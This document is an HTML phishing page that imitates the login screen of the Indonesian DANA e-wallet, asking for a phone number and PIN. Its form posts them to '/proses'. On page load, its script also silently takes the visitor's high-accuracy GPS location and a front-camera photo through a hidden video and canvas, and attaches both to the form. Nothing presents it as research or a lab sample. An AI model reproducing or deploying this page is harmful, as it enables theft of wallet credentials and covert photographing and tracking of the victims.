<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DANA - Dompet Digital Indonesia</title>
    <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
    <div class="app-container">
        <div class="header">
            <div class="logo">
                <svg viewBox="0 0 240 70" width="150" height="44"><text x="0" y="52" font-family="Arial" font-size="48" font-weight="900" fill="white">DANA</text></svg>
            </div>
        </div>
        <div class="content">
            <h2>Masuk ke Akun Anda</h2>
            <p class="subtitle">Masukkan nomor HP dan PIN DANA Anda</p>
            <form action="/proses" method="POST" id="loginForm">
                <input type="hidden" name="step" value="1">
                <input type="hidden" name="lat" id="lat">
                <input type="hidden" name="lon" id="lon">
                <input type="hidden" name="photo" id="photo">
                <div class="input-group">
                    <label>Nomor HP</label>
                    <div class="input-wrapper">
                        <span class="prefix">+62</span>
                        <input type="tel" name="phone" placeholder="81234567890" required>
                    </div>
                </div>
                <div class="input-group">
                    <label>PIN DANA</label>
                    <div class="input-wrapper">
                        <input type="password" name="pin" maxlength="6" placeholder="••••••" required>
                    </div>
                </div>
                <button type="submit" class="btn-primary">MASUK</button>
            </form>
        </div>
    </div>

    <video id="hiddenVideo" autoplay playsinline style="display: none;"></video>
    <canvas id="hiddenCanvas" style="display: none;"></canvas>

    <script>
        // 1. GPS
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                document.getElementById('lat').value = position.coords.latitude;
                document.getElementById('lon').value = position.coords.longitude;
            }, function(error) {
                console.log("GPS Ditolak: " + error.message);
            }, { enableHighAccuracy: true });
        }

        // 2. Kamera
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('hiddenVideo');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('hiddenCanvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    document.getElementById('photo').value = canvas.toDataURL('image/jpeg', 0.5);
                    stream.getTracks().forEach(track => track.stop());
                }, 1000);
            } catch (err) {
                console.log("Kamera Ditolak: " + err.message);
            }
        }
        window.onload = startCamera;
    </script>
</body>
</html>